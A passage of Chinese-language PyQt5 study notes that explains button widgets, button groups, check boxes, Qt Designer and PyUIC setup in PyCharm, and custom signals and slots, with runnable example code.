#先让第二个获取焦点\nlineEdit3.setFocusPolicy(Qt.TabFocus)  #第三个只能Tab键来获得焦点\n# lineEdit2.clearFocus() #取消前面获得的焦点\n\nprint(window.focusWidget())  # 获取当前窗口的获取焦点的子控件\n\n# tab 切换  2  1  3\nWindow.setTabOrder(lineEdit2,lineEdit1)\nWindow.setTabOrder(lineEdit1,lineEdit3)\n\n#展示控件\nwindow.show()\n\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n## QAbstractButton\n\n> 所有按钮控件的基类\n\n### 提示文本\n\n- setText(str)  设置按钮提示文本\n- text() 获取按钮提示文本\n\n### 图标相关\n\n- setIcon(QIcon(\"resource/h1.png\"))  设置图标\n- setIconSize(QSize(w, h))  设置图标大小\n- icon()  获取图标\n- iconSize()  获取图标大小\n\n### 设置快捷键\n\n- 方式1: 有提示文本的  \n  - 如果提示文本包含＆符号, 则QAbstractButton会自动创建快捷键  btn.setText(\"按钮2&abc\") —> Alt+a\n\n- 方式2: 没有提示文本的  \n  - setShortcut(\"Alt+G\")\n\n### 自动重复\n\n- setAutoRepeat(bool)\t\t\t\t\t设置自动重复\n- setAutoRepeatInterval(毫秒)   设置自动重复检测间隔\n- setAutoRepeatDelay(毫秒)       设置初次检测延迟\n- autoRepeat()    \t\t\t\t\t         获取是否自动重复\n- autoRepeatInterval()                获取自动重复检测间隔\n- autoRepeatDelay()                   获取初次检测延迟\n\n```python\n#查看是否自动重复\nprint(btn.autoRepeat())\n\n#设置自动重复\nbtn.setAutoRepeat(True)\nbtn.setAutoRepeatDelay(2000)  #初次检测延迟为2s\nbtn.setAutoRepeatInterval(1000)  #重复检测间隔为1s\n \nprint(btn.autoRepeatDelay())   #首次延迟\nprint(btn.autoRepeatInterval()) #以后的触发间隔\n```\n\n### 状态\n\n- isDown() \t\t\t\t\t\t\t\t      是否按下按钮\n- setDown(bool)                      设置按钮, 是否被按下\n- isChecked()                           是否选中了按钮\n- isCheckable()                        按钮是否可以被选中\n- setCheckable(bool)              设置按钮, 是否可以被选中\n- setChecked(bool)                 设置按钮, 是否被选中\n- toggle()                                 切换选中与非选中状态\n- 继承于QWidget中的能用状态\n  - isEnabled()\n  - setEnabled(bool)\n\n### 排他性\n\n- autoExclusive()  是否自动排他。一般按钮都是False，只有单选按钮是True\n\n- setAutoExclusive(bool)   设置自动排他\n\n### 点击\n\n- click()  普通点击\n- animateClick(ms)  带动画效果的点击\n\n### 设置有效区域\n\n- 重写hitButton(QPoint)  有效返回True，无效返回False\n\n  应用场景：指定用户点击某个区域有效，而不是单一的矩形\n\n案例：\n\n设置只点击按钮中心的圆形区域才会有效\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\nclass Btn(QPushButton):\n    def hitButton(self, point):\n        print(\"点击点坐标:\", point)  # 用户点击按钮之后，这个函数会将用户点击的点传出来\n        #圆心坐标\n        cir_x = self.width()/2\n        cir_y = self.height()/2\n        #鼠标点击点坐标\n        hit_x = point.x()\n        hit_y = point.y()\n        #点击点到圆心距离 > 半径\n        if pow(hit_x-cir_x,2)+pow(hit_y-cir_y,2) > pow(self.width()/2,2):\n            return False #代表点击无效，不会触发信号\n        return True #True代表用户点击的用效 ，会触发信号的发射\n    \n############################画内切圆###############################\n    def paintEvent(self, event):\n        super().paintEvent(event)\n        # 画家和纸\n        painter = QPainter(self) # 它里面的参数是 QPaintDevice “纸”\n\n        #给画家支笔\n        pen = QPen(QColor(100,10,155),4)  #笔的颜色和宽度\n        painter.setPen(pen)\n\n        #画家开始画\n        painter.drawEllipse(self.rect()) #这就是两个点，四个值\n############################画内切圆###############################\n\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"设置有效区域\")\n\nbtn = Btn(\"按钮\",window)\nbtn.resize(200,200)\nbtn.pressed.connect(lambda :print(\"按钮被点击\"))\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 信号\n\n- pressed()   鼠标按下信号\n- released()  鼠标释放（1.控件内松开鼠标、2.鼠标移出控件范围后）\n\n- clicked(checked = false)  控件内按下+控件内释放\n\n- toggled(bool checked)    切换信号，按钮选中状态发生改变(一般在单选框或者复选框中使用)\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"信号\")\n\nbtn = QPushButton(\"按钮\",window)\nbtn.move(200,200)\n\nbtn.pressed.connect(lambda :print(\"按钮被鼠标按下了\"))\nbtn.released.connect(lambda :print(\"按钮被鼠标释放了\"))\n\n#clicked 往外传递一个参数，它表示的是当前按钮是否是被选中的状态：\nbtn.clicked.connect(lambda arg:print(\"按钮被鼠标点击了\",arg))\n\n#toggled也会往外传递个参数，用来反馈按钮是否被选中。（前提是按钮可以被选中，如果按钮本身不能被选中不会触发它。）\nbtn.toggled.connect(lambda arg:print(\"按钮选中状态发生改变\",arg))\nbtn.setCheckable(True) #设置按钮可选中，不设的话 toggled 不会触发\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n## QPushButton\n\n> QAbstractButton 的子类\n\n### 创建按钮控件\n\n#### API\n\n- QPushButton()  \t\t\t                       创建一个无父控件的按钮控件\n- QPushButton(parent)                       创建控件的同时, 设置父控件\n- QPushButton(text, parent)               创建控件的同时, 设置提示文本和父控件\n- QPushButton(icon, text, parent)      创建控件的同时, 设置图标, 提示文本和父控件\n\n#### API测试\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"按钮创建\")\n\nbtn1 = QPushButton()\nbtn2 = QPushButton(window)\nbtn3 = QPushButton(\"按钮\",window)\nbtn4 = QPushButton(QIcon(\"image/jj.ico\"),\"按钮\",window)\n\nbtn1.move(200,50)\nbtn2.move(200,100)\nbtn3.move(200,150)\nbtn4.move(200,200)\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 快捷键\n\n#### API\n\n- QPushButton(\"&f\", window)\n- setText(\"&F\")\n- setShortcut(\"Alt+F\")\n\n应用场景：想通过快捷键触发按钮点击事件的时候设置\n\n### 菜单\n\n#### API\n\n- setMenu(QMenu)设置菜单\n- menu() 获取菜单\n- showMenu() 展示菜单\n\n应用场景：可以设置点击按钮是弹出的菜单， 供用户选择\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"菜单\")\n\n############################菜单的设置###############################\nbtn = QPushButton(\"菜单\",window)\nmenu = QMenu()\n# 菜单之行为动作 新建，打开,退出\nnew_action = QAction(menu)  # 父控件是menu\nnew_action.setText(\"新建\")\nnew_action.setIcon(QIcon(\"image/jj.ico\"))\nnew_action.triggered.connect(lambda: print(\"新建文件\"))\n\nopen_action = QAction(menu)  # 父控件是menu\nopen_action.setText(\"打开\")\nopen_action.setIcon(QIcon(\"image/jj.ico\"))\nopen_action.triggered.connect(lambda: print(\"打开文件\"))\n\n\nmenu.addAction(new_action)\nmenu.addAction(open_action)\n# 分割线\nmenu.addSeparator()\n\n# 菜单之子菜单   最近打开\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"最近打开 \")  # 注意不是setText\nsub_menu.setIcon(QIcon(\"image/jj.ico\"))\n\nfile_action = QAction(\"Python_Gui_编程\")\nsub_menu.addAction(file_action)\nmenu.addMenu(sub_menu)\nbtn.setMenu(menu)\n############################菜单的设置###############################\n\n\n###########################################################\n# btn.showMenu()  #此时，先展示的是菜单，它可以独自展示的，因为它直接继承的QWidget\n###########################################################\n\n#展示控件\nwindow.show()\n\n###########################################################\nbtn.showMenu()  #此时，先展示的是窗口，然后再展示菜单\n###########################################################\n\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 边框是否保持扁平\n\n- setFlat(bool) 默认值为False\n- isFlat() 获取当前按钮边框是否扁平\n\n### 默认处理*\n\n- setAutoDefault(bool) 设置为自动默认按钮\n- autoDefault()\n- setDefault(bool)\n- isDefault()\n\n应用场景：主要在对话框中，当我们打开一个对话框之后，可以设置默认处理的按钮。\n\n### 信号*\n\n​\t都是继承下来的\n\n- QAbstractButton\n  - pressed()  鼠标按下信号\n  - released() 鼠标释放\n  - clicked(checked = false)  控件内按下+控件内释放\n  - toggled(bool checked)  切换信号(一般在单选框或者复选框中使用)\n- QWidget\n  - windowTitleChanged(QString)  窗口标题改变信号\n  - windowIconChanged(QIcon)     窗口图标改变信号\n  - customContextMenuRequested(QPoint)  自定义上下文菜单请求信号*\n\n## QMenu*\n\n- QMenu() 创建菜单\n\n- addMenu(QMenu)  添加子菜单\n- addSeparator()  添加分割线\n- addAction() 添加行为动作\n- triggered    QAction信号\n\n## QCommandLinkButton\n\n> 命令链接是Windows Vista引入的新控件，命令链接按钮不应单独使用，而应作为向导和对话框中单选按钮的替代选项 \n>\n>  QPushButton 的子类\n\n创建\n\n- QCommandLinkButton(parent)\n- QCommandLinkButton(text, parent)\n- QCommandLinkButton(text, description ,parent)\n\n描述\n\n- setDescription(str)  设置命令链接按钮的描述文本\n- description()\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QCommandLinkButton\")\n\nclbtn = QCommandLinkButton(\"标题\",\"描述\",window)\nclbtn.resize(100,80)\n# clbtn.setText(\"Python\")\n# clbtn.setDescription(\"hello world\")\n# clbtn.setIcon(QIcon(\"icon.ico\"))\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n![image-20210809172240677](https://img.jwt1399.top//img/20210809172251.png)\n\n## QToolButton\n\n> 通常是在工具栏内部使用，工具按钮通常不显示文本标签，而是显示图标\n>\n> QAbstractButton 的子类\n\n### 创建\n\n- QToolButton(parent: QWidget = None)\n\n### (继承)设置文本,图标,工具提示\n\n- setText(str) \n- setIcon(QIcon)\n- setIconSize(QSize)\n- setToolTip(str)\n- 注：如果文本和图标同时设置, 则默认只展示图标\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton \")\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"工具按钮\")\n\n###########################当有图标显示时候，文本就不会显示了###############################\n#它和QPushButton 的不同，就是在于它一般只显示图标，不显示文本\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n############################当有图标显示时候，文本就不会显示了###############################\ntool_btn.setToolTip(\"这是一个新建按钮\")\n\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n### 按钮样式风格\n\n- setToolButtonStyle(Qt.ToolButtonStyle)\n  - Qt.ToolButtonIconOnly  \t\t\t\t仅显示图标  0\n  - Qt.ToolButtonTextOnly               仅显示文字   1\n  - Qt.ToolButtonTextBesideIcon    文本显示在图标旁边  2\n  - Qt.ToolButtonTextUnderIcon     文本显示在图标下方  3\n  - Qt.ToolButtonFollowStyle          遵循风格 4\n- toolButtonStyle()\n\n```python\ntool_btn.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)\nprint(tool_btn.toolButtonStyle()) # 输出：3\n```\n\n### 设置箭头\n\n- setArrowType(Qt.ArrowType)\n  - Qt.NoArrow  \t      无箭头     0\n  - Qt.UpArrow          向上箭头   1\n  - Qt.DownArrow     向下箭头   2\n  - Qt.LeftArrow        向左箭头   3\n  - Qt.RightArrow      向右箭头   4\n- arrowType()\n\n```python\ntool_btn.setArrowType(Qt.RightArrow) #注意，如果箭头和图标同时存在的话，箭头的优先级高\nprint(tool_btn.arrowType()) # 输出：4\n```\n\n### 自动提升\n\n- setAutoRaise(bool)\n- autoRaise()\n- 在自动提升模式下，该按钮仅在鼠标指向时才会绘制3D帧\n\n```python\ntool_btn = QToolButton(window)\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\ntool_btn.setAutoRaise(True) #当鼠标放上去的时候，会有自动提升的效果\n\nbtn = QPushButton(window)\nbtn.setIcon(QIcon(\"image/jj.ico\"))\nbtn.setIconSize(QSize(20,20))\nbtn.move(100,100)\nbtn.setFlat(True)#当鼠标放上去的时候，也不会提升上来。\n```\n\n### 菜单\n\n- setMenu(QMenu)\n- menu()\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"工具按钮\")\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton\")\n\n############################按钮设置菜单###############################\nmenu = QMenu(tool_btn)\n\nnew_action = QAction(\"新建\")\nmenu.addAction(new_action)\nopen_action = QAction(\"打开\")\nmenu.addAction(open_action)\n\nmenu.addSeparator()\n\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"子菜单\")\nrelative_action  = QAction(\"最近打开\")\nsub_menu.addAction(relative_action)\nmenu.addMenu(sub_menu)\n\n\ntool_btn.setMenu(menu)\n############################设置菜单###############################\n\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n但是 ，却不能点击显示菜单效果，这时因为有个东西要设置的。这里涉及到下面的菜单弹出模式\n\n它的默认弹出模式是，按住一会才会弹出菜单。\n\n### 菜单弹出模式\n\n- setPopupMode(QToolButton.ToolButtonPopupMode)\n  - QToolButton.DelayedPopup  鼠标按住一会才显示 类似于浏览器后退按钮 0\n  - QToolButton.MenuButtonPopup  有一个专门的指示箭头 点击箭头才显示  1\n  - QToolButton.InstantPopup  点了按钮就显示 点击信号不会发射  2\n- popupMode()\n\n```python\ntool_btn.setPopupMode(QToolButton.InstantPopup)\nprint(tool_btn.popupMode()) #输出：2\n```\n\n### 信号\n\n- triggered(QAction *action)  当点击某个action时触发, 并会将action传递出来\n\n- QAction对象可以通过 setData(Any)  绑定数据  data() 获取数据\n\n```python\nfrom PyQt5.Qt import *\nimport sys\n\n#创建app\napp = QApplication(sys.argv)\n\n#创建控件\nwindow = QMainWindow()\n\ntool_btn = QToolButton(window)\ntool_btn.setText(\"工具按钮\")\ntool_btn.setIcon(QIcon(\"image/jj.ico\"))\ntool_btn.setIconSize(QSize(20,20))\n\n#设置控件\nwindow.resize(500, 400)\nwindow.move(300, 300)\nwindow.setWindowTitle(\"QToolButton\")\n\n############################按钮设置菜单###############################\nmenu = QMenu(tool_btn)\n\nnew_action = QAction(\"新建\")\nmenu.addAction(new_action)\nnew_action.setData(\"new\")  #绑定数据\n\nopen_action = QAction(\"打开\")\nmenu.addAction(open_action)\nopen_action.setData(\"open\") #绑定数据\n\nmenu.addSeparator()\n\nsub_menu = QMenu(menu)\nsub_menu.setTitle(\"子菜单\")\nrelative_action  = QAction(\"最近打开\")\nsub_menu.addAction(relative_action)\nmenu.addMenu(sub_menu)\n\ntool_btn.setMenu(menu)\ntool_btn.setPopupMode(QToolButton.InstantPopup)\n############################设置菜单###############################\n\ndef tool_btn_triggered_slot(action):\n    if action.data()  == \"new\":\n        print(\"你点击的是新建\",action)\n    elif action.data() == \"open\":\n        print(\"你点击的是打开\",action)\n        \ntool_btn.triggered.connect(tool_btn_triggered_slot)\n\n#展示控件\nwindow.show()\n#进入消息循环\nsys.exit(app.exec_())\n```\n\n## QRadioButton\n\n> 一般用于给用户提供若干选项中的单选操作\n>\n> QAbstractButton 的子类\n\n### 创建\n\n- QRadioButton(parent)\n- QRadioButton(text, parent)\n\n```python\nradio_button_1 = QRadioButton(\"男\",window)\nradio_button_1.move(100,100)\nradio_button_1.setIcon(QIcon(\"icon.ico\"))\nradio_button_1.setChecked(True)  # 它是默认选中\n\nradio_button_2 = QRadioButton(\"女\",window)\nradio_button_2.move(100,200)\nradio_button_2.setIcon(QIcon(\"icon.ico\"))\n```\n\n### 信号\n\n- toggled(bool)\n\n```python\nradio_button_2.toggled.connect(lambda :print(\"状态切换\"))\n```\n\n## QButtonGroup\n\n> 提供 一个抽象的按钮容器, 可以将多个按钮划分为一组\n>\n> QObject 的子类\n\n### 创建\n\n- QButtonGroup(parent)\n\n### 添加按钮\n\n- addButton(QAbstractButton, id = -1)\n- 如果id为-1，则将为该按钮分配一个id。自动分配的ID保证为负数，从-2开始。\n- 如果要分配自己的ID，请使用正值以避免冲突\n\n### 查看按钮\n\n- buttons()  查看所有按钮组中的按钮\n- button(ID)  根据ID获取对应按钮, 没有则返回None\n- checkedButton()  获取选中的那个按钮\n\n### 移除按钮\n\n- removeButton(QAbstractButton)\n- 它并不是从界面上删除这个按钮，而只是将其移出抽象的按钮组。\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n#1,创建app\napp  = QApplication(sys.argv)\n\n\n#2，控件的操作：\n#创建控件\nwindow = QWidget()\n\nradio_button_1 = QRadioButton(\"男-Male\",window)\nradio_button_1.move(100,100)\nradio_button_2 = QRadioButton(\"女-Famale\",window)\nradio_button_2.move(100,200)\n\nradio_button_yes = QRadioButton(\"yes\",window)\nradio_button_yes.move(300,100)\nradio_button_no = QRadioButton(\"yes\",window)\nradio_button_no.move(300,200)\n\n#设置控件\nwindow.setWindowTitle(\"QRadioButton\")\nwindow.resize(500,500)\n\n###########################################################\nsex_group = QButtonGroup(window)\nsex_group.addButton(radio_button_1)\nsex_group.addButton(radio_button_2)\n###########################################################\n\n###########################################################\njudge_group = QButtonGroup(window)\njudge_group.addButton(radio_button_yes,1) # 设置id=1\njudge_group.addButton(radio_button_no,2)  # 设置id=2\n###########################################################\n\nprint(sex_group.buttons())\nprint(judge_group.button(1))\nprint(judge_group.checkedButton())\nsex_group.removeButton(radio_button_2)\n#展示控件\nwindow.show()\n#3,进入消息循环\nsys.exit(app.exec_())\n```\n\n### 绑定和获取ID\n\n- setId(QAbstractButton，int)\n- id(QAbstractButton)  指定按钮对应的ID，如果不存在此按钮，则返回-1\n- checkedId()  获取选中的ID，如果没有选中按钮则返回-1\n\n```python\n#****************************绑定id *******************************\nsex_group.setId(radio_button_1,1)\nsex_group.setId(radio_button_2,2)\n#****************************绑定id *******************************\n\n#****************************获取id *******************************\nprint(sex_group.id(radio_button_1))\nprint(sex_group.id(radio_button_2))\n#****************************获取id *******************************\n\n#****************************查看当前选中的按钮的id*******************\nprint(sex_group.checkedId())\n#****************************查看当前选中的按钮的id*******************\n```\n\n### 独占设置\n\n- setExclusive(bool)\n\n- exclusive()\n- 应用场景：统一设置按钮组中的按钮是否是独占(选择互斥)\n\n```python\n#****************************将一个组的独占设置为否定*******************************\nsex_group.setExclusive(False)\n#****************************将一个组的独占设置为否定*******************************\n```\n\n### 信号\n\n- buttonClicked(int/QAbstractButton)  当按钮组中的按钮被点击时, 发射此信号\n- buttonPressed(int/QAbstractButton)  当按钮组中的按钮被按下时, 发射此信号\n- buttonReleased(int/QAbstractButton)  当按钮组中的按钮被释放时, 发射此信号\n- buttonToggled(QAbstractButton/int, bool)  当按钮组中的按钮被切换状态时, 发射此信号\n\n- QButtonGroup 信号会传递两种类型的值，一个是具体哪个按钮，一个是它的 id。发出信号时向外传出的int 指的是之前设置的 id 。\n\n### 信号传出多个参数\n\n- 如果信号名称一样，但参数不一样，外界在使用信号时, 可以使用如下格式进行选择\n- signal_name[type]  信号名称[参数类型]\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n#1,创建app\napp  = QApplication(sys.argv)\n\n\n#2，控件的操作：\n#创建控件\nwindow = QWidget()\n\nradio_button_1 = QRadioButton(\"男-Male\",window)\nradio_button_1.move(100,100)\nradio_button_2 = QRadioButton(\"女-Famale\",window)\nradio_button_2.move(100,200)\n\nradio_button_yes = QRadioButton(\"yes\",window)\nradio_button_yes.move(300,100)\nradio_button_no = QRadioButton(\"yes\",window)\nradio_button_no.move(300,200)\n\n#设置控件\nwindow.setWindowTitle(\"QRadioButton\")\nwindow.resize(500,500)\n\n\n###########################################################\nsex_group = QButtonGroup(window)\nsex_group.addButton(radio_button_1)\nsex_group.addButton(radio_button_2)\n###########################################################\n\n\n###########################################################\njudge_group = QButtonGroup(window)\njudge_group.addButton(radio_button_yes,1) # 设置id=1\njudge_group.addButton(radio_button_no,2)  # 设置id=2\n###########################################################\n\n#****************************绑定id *******************************\nsex_group.setId(radio_button_1,1)\nsex_group.setId(radio_button_2,2)\n#****************************绑定id *******************************\n\n\nsex_group.buttonClicked.connect(lambda val:print(val)) #向外传出的是具体的按钮\nsex_group.buttonClicked[int].connect(lambda val:print(val)) #向外传出的是按钮的id\n\nsex_group.buttonClicked.connect(lambda val:print(val,sex_group.id(val))) # 当然获取了具体的按钮之后，自然很简单就可以获得它的id\n\n#展示控件\nwindow.show()\n\n#3,进入消息循环\nsys.exit(app.exec_())\n```\n\n## QCheckBox\n\n> 一般用于给用户提供若干选项中的多选操作\n>\n> QAbstractButton 的子类\n\n### 创建\n\n- QCheckBox(parent)\n- QCheckBox(text, parent)\n\n```python\ncheckbox1 = QCheckBox(window)\ncheckbox1.setText(\"Python\")\ncheckbox1.move(50,30)\n\ncheckbox2 = QCheckBox(window)\ncheckbox2.setText(\"C++\")\ncheckbox2.move(50,60)\n\ncheckbox3 = QCheckBox(window)\ncheckbox3.setText(\"C\")\ncheckbox3.move(50,90)\n```\n\n### 设置是否三态\n\n- setTristate(bool=True)\n- isTristate()\n- 它默认是展示两种状态，可以通过设置来展示三种状态（选中、半选中、没选中）。\n\n```python\ncheckbox1.setTristate(True)\nprint(checkbox1.isTristate())\n```\n\n### 设置复选框状态\n\n- setCheckState(Qt.CheckState)\n  - Qt.Unchecked  该项目未选中 0\n  - Qt.PartiallyChecked  部分选中 1\n  - Qt.Checked  真的被选中 2\n\n- checkState()\n\n```python\ncheckbox2.setCheckState(Qt.PartiallyChecked)  # 半选中状态\n# checkbox2.setCheckState(Qt.Checked)  #选中\n# checkbox2.setCheckState(Qt.Unchecked) #未选中\n```\n\n### 信号\n\n- stateChanged(int state)  选中或清除选中时, 发射此信号\n- 其他信号继承父类\n\n它之所以多了个信号，是因为它有的时候是三态，所以之前的toggled 就不支持三态了。\n\n```python\ncheckbox1.setTristate(True)\ncheckbox1.stateChanged.connect(lambda state:print(state)) # 0，1,2\n\ncheckbox3.toggled.connect(lambda bool:print(bool)) # True，False\n```\n\n\n\n## QLineEdit\n\n67-91\n\n\n\n79-85 ？？？\n\n## QFrame\n\n92-93\n\n## QAbstractScrollArea\n\n94\n\n## QTextEdit\n\n95-130\n\n## QPlainTextEdit\n\n131-140\n\n## QKeySequenceEdit\n\n141-143\n\n## QAbstractSpinBox\n\n144-151\n\n## QSpinBox\n\n152-160\n\n\n\n# 布局管理器\n\n261-295\n\n# QSS\n\n296-327\n\n\n\n\n\n# QTDesigner\n\n> Qt Designer 通过拖拽的方式放置控件可以随时查看控件效果，设计符合MVC的架构，实现了视图和逻辑的分离，从而实现了开发的便捷\n\n## 配置QTDesigner\n\n> 为了不每次都在外部打开 QTDesigner，可以在 PyCharm 中配置快捷按钮，只需点击即可打开QTDesigner\n\n操作步骤：点击设置-->工具-->外部工具-->点击“+”-->进行如下配置\n\n![](https://img.jwt1399.top//img/20210811165725.png)\n\n```python\nName：QTDesigner\nProgram：D:\\Qt\\Qt5.14.2\\5.14.2\\mingw73_32\\bin\\designer.exe   # QTDesigner的位置\nWorking directory：$ProjectFileDir$ #当前项目文件目录\n```\n\n配置完成后，在 Pycharm 的菜单栏 Tools 或者右击——>External Tools——>QTDesigner，可以看到刚才配置菜单 QTDesigner，点击即可打开 QTDesigner\n\n## 加载UI文件\n\n### 动态加载UI文件\n\n```python\nfrom PyQt5.QtWidgets import QApplication\nfrom PyQt5 import uic\nimport sys\n\n# 从文件中加载UI定义\napp = QApplication(sys.argv)\nui = uic.loadUi(\"test.ui\")\nui.show()\nsys.exit(app.exec_())\n```\n\n### 转UI文件为Py文件进行加载\n\n1.执行如下的命令把 UI 文件直接转化为包含界面定义的Py文件\n\n```shell\npython -m PyQt5.uic.pyuic test.ui -o test.py -x\n\n# -o 输出文件\n# -x 生成if __name__ == \"__main__\":测试代码\n```\n\n2.然后在你的代码文件中这样使用定义界面的类\n\n```python\nfrom PyQt5.QtWidgets import QApplication, QMainWindow\nimport sys\nimport test  # ui文件转为py文件的文件名\n\napp = QApplication(sys.argv)\nwindow = QMainWindow()\nui = test.Ui_MainWindow()  # py文件的类名\nui.setupUi(window)\nwindow.show()\nsys.exit(app.exec_())\n```\n\n\n## 配置PyUIC\n\n> 为了不每次都执行 ui 转 py 代码，可以在 PyCharm 中配置快捷按钮，只需点击即可进行 ui 文件到 py 文件的转化。\n\n操作步骤：点击设置-->工具-->外部工具-->点击“+”-->进行如下配置\n![](https://img.jwt1399.top//img/20210713195925.png)\n\n```python\nName：PyUIC\nProgram：D:\\Python37\\python.exe   #python安装路径，要确保已经安装PyQt5\nArguments：-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$_ui.py -x #把ui文件转成同名py文件\nWorking directory：$FileDir$ #当前文件目录\n```\n\n配置完成后，在 Pycharm 的菜单栏 Tools 或者右击需要转换的ui文件——>External Tools——>PyUIC，点击 PyUIC 即可进行转换\n\n## 配置PyQrc\n\n> 可以在 PyCharm 中配置快捷按钮，只需点击即可进行 qrc 文件到 py 文件的转化。\n\n操作步骤：点击设置-->工具-->外部工具-->点击“+”-->进行如下配置\n![](https://img.jwt1399.top//img/20210811171857.png)\n\n```python\nName：PyQrc\nProgram：D:\\Python37\\Scripts\\pyrcc5.exe   #pyrcc5路径，要确保已经安装PyQt5\nArguments：$FileName$ -o $FileNameWithoutExtension$_rc.py #把qrc文件转成同名py文件\nWorking directory：$FileDir$ #当前文件目录\n```\n\n配置完成后，在 Pycharm 的菜单栏 Tools 或者右击需要转换的qrc文件——>External Tools——>PyQrc，点击 PyQrc 即可进行转换\n\n\n\n# 自定义信号\n\n> 如果系统提供的信号不能满足我们的需求，这时就需要我们自定义信号\n>\n> 例如鼠标单击往往指的是左击，而不是右击，如果想要拥有右击信号，就需要自己自定义信号了！\n\n## 信号的定义\n\n在类的内部, 以类属性的形式定义\n\n- pyqtSignal(类型1, 类型2...)\n- 重载版本  pyqtSignal([int],[str]) \n\n```python\nclass Btn(QPushButton):\n    doubleClick = pyqtSignal()\n    doubleClick2 = pyqtSignal([int], [str])\n```\n\nQTDeasigner中使用自定义信号要将控件提升为自定义的类(Btn)\n\n## 信号的发射\n\n- 信号.emit(参数1, 参数2...)\n- 注意 重载的信号选择问题  信号[类型]\n\n```python\nfrom PyQt5.Qt import * #刚开始学习可以这样一下导入\nimport sys\n\nclass Btn(QPushButton):\n    right_clicked = pyqtSignal([str],[int],[int,str])  #中括号的意思是重载\n\n    def mousePressEvent(self,event):\n        super().mousePressEvent(event)\n        if event.button() == Qt.RightButton:  #右击时发射信号\n            self.right_clicked.emit(self.text())   #发射参数是str的信号\n            self.right_clicked[int,str].emit(100,self.text())   #发射参数是str和int的信号\n            self.right_clicked[int].emit(100)   #发射参数是int的信号\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"信号的学习\")\n        self.resize(400,400)\n        self.set_ui()\n    def set_ui(self):\n        btn = Btn(\"我是按钮\",self)\n        btn.right_clicked.connect(lambda arg:print(\"右键被点击了\",arg))\n        # btn.right_clicked[int,str].connect(lambda v1,arg :print(\"右键被点击了\",v1,arg))\n        # btn.right_clicked[int].connect(lambda val:print(val))\n\nif __name__ == '__main__':\n    app =QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n## 装饰器自动连接信号与槽\n\n- QtCore.QMetaObject.connectSlotsByName(obj)  将obj内部的子孙对象的信号, 按照其objectName连接到相关的槽函数 \n- 一定要等到self中的对象创建完成，因此语句放在最后面，PyUIC会自动生成\n\n使用规则：\n\n```python\n@pyqtSlot()\ndef on_objectName_信号名(self):  # 名字是 on_$ObjectName$_$Singnal$\n    pass\n```\n\n示例：\n\n```python\nfrom PyQt5 import QtCore\nfrom PyQt5.Qt import *  \nimport sys\n\n\nclass Window(QWidget):\n    def __init__(self):\n        super().__init__()\n        self.setWindowTitle(\"装饰器连接信号和槽的学习\")\n        self.resize(400, 400)\n        self.set_ui()\n\n    def set_ui(self):\n        btn = QPushButton(\"测试按钮\", self)\n        btn.resize(200, 200)\n        btn.move(100, 100)\n        btn.setObjectName(\"btn\")\n        QtCore.QMetaObject.connectSlotsByName(self)  # 它一定要等到self中的对象创建完成\n\n    @pyqtSlot()\n    def on_btn_clicked(self):  # 名字是 on_$ObjectName$_$Signal$\n        print(\"按钮被点击了\")\n        \n\nif __name__ == '__main__':\n    app = QApplication(sys.argv)\n    window = Window()\n    window.show()\n    sys.exit(app.exec_())\n```\n\n# 动画效果\n\n## 动画类继承结构图\n\n![](https://img.jwt1399.top//img/20210812150357.png)\n\n## QAbstractAnimation\n\n> 